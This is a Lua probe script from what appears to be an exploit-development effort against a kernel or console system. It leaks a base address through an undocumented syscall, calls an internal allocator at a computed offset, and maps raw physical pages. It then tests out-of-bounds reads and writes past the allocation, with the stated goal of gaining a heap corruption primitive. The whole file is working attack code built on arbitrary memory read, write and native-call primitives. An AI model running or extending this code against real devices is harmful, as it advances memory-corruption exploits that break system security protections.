-- CRASH_CLASS: HIGH
-- PROBE 533j: Direct memory read on pager-extended pages
--
-- 533f: writev(/dev/null) = VALID for 49+ pages past allocation
-- 533i: writev(socket) = FAIL for pages 10+ (copyin fails)
-- sanity: writev(socket) = OK for page 0 (the allocated page)
--
-- Hypothesis: The pager extends PTE entries but pages 1+ are
-- zero-fill-on-demand (no physical frame). writev to /dev/null
-- doesn't actually read the memory (just validates the VA range
-- in the iovec check). Real reads would either:
-- a) Trigger demand-paging and get zero-filled pages (free memory)
-- b) Fault (SIGSEGV)
--
-- Test: try memory.read_dword on pages 0, 1, 2 via pcall.
-- If they return data, we have access to MORE memory than allocated.
-- Even if it's just zero-fill, we can potentially write it and
-- use it as a heap primitive.

print("=== PROBE 533j: DIRECT READ EXTENDED ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local sc_writev = make_syscall(121)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_628 = make_syscall(628)

local lk = uint64(0)
do
    local info = memory.alloc(0x200)
    zero(info, 0x200); wd(info, 0x160)
    pcall(function() make_syscall(593)(uint64(0x2001), info) end)
    lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
end
print("lk=" .. q(lk))
local alloc_fn = lk + uint64(0x17EF0)

-- Open /dev/null
local path_buf = memory.alloc(16)
zero(path_buf, 16)
write_string(path_buf, "/dev/null\0")
local ok_o, null_fd = pcall(function()
    return sc_open(uint64(path_buf), uint64(2), uint64(0))
end)
null_fd = to_num(null_fd)
print("null_fd=" .. null_fd)

-- Allocate near pool end
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FFC0000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
local phys_n = to_num(phys)
print("phys=" .. q(phys))

local pool_end = 0x150000000
local pages_to_end = math.floor((pool_end - phys_n) / 0x4000)
print("pages_to_end=" .. pages_to_end)

-- Map
local ok_m, map_va = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64(-1),
        uint64(3), uint64(0), phys)
end)
print("VA=" .. q(map_va))

-- [A] Verify page 0 works
print("")
print("[A] Verify allocated page")
local d0 = rd(to_num(map_va))
print("  pg0 dword[0]=" .. string.format("0x%X", d0 and (d0 < 0 and d0 + 0x100000000 or d0) or 0))
wd(to_num(map_va), 0xDEADBEEF)
local d0b = rd(to_num(map_va))
print("  wrote 0xDEADBEEF, read=" .. string.format("0x%X", d0b and (d0b < 0 and d0b + 0x100000000 or d0b) or 0))

-- [B] Try to read pages 1 through 20
-- Each of these is PAST the allocated page. If the pager
-- extends on demand, the read should work (returning 0).
-- If not, pcall catches the SIGSEGV.
print("")
print("[B] Direct read test (pages 1-20)")

local page_size = 0x4000
local iov = memory.alloc(16)

for pg = 1, 20 do
    local addr_n = to_num(map_va) + pg * page_size
    local addr = map_va + uint64(pg * page_size)
    local phys_est = phys_n + pg * page_size
    local bm = phys_est >= pool_end and " PAST" or ""

    -- First: writev to /dev/null (safe check)
    wq(iov, addr)
    wq(iov + 8, uint64(16))
    local ok_chk, chk = pcall(function()
        return sc_writev(uint64(null_fd), uint64(iov), uint64(1))
    end)
    local valid = to_num(chk) == 16

    -- Then: try direct read
    local ok_dr, dval = pcall(function() return memory.read_dword(addr_n) end)

    if ok_dr then
        local dn = to_num(dval)
        if dn < 0 then dn = dn + 0x100000000 end
        print(string.format("  pg %02d (0x%X)%s: writev=%s read=0x%08X",
            pg, phys_est, bm, valid and "OK" or "FAIL", dn))
    else
        print(string.format("  pg %02d (0x%X)%s: writev=%s read=FAULT",
            pg, phys_est, bm, valid and "OK" or "FAIL"))
        -- If read faults, next page might kill the process
        -- Stop after first fault
        print("  (stopping: read fault)")
        break
    end
end

-- [C] If reads work past page 0, try WRITE + read-back
print("")
print("[C] Write test on extended pages")
local test_pg = 1
local test_addr_n = to_num(map_va) + test_pg * page_size
local ok_wr = pcall(function() memory.write_dword(test_addr_n, 0x41414141) end)
if ok_wr then
    local rb = rd(test_addr_n)
    if rb then
        if rb < 0 then rb = rb + 0x100000000 end
        print(string.format("  pg 1: wrote 0x41414141, read=0x%08X %s",
            rb, rb == 0x41414141 and "R/W CONFIRMED" or "MISMATCH"))
    end
else
    print("  pg 1: write FAULT")
end

if null_fd > 0 then pcall(function() sc_close(uint64(null_fd)) end) end
print("")
print("=== 533j DONE ===")
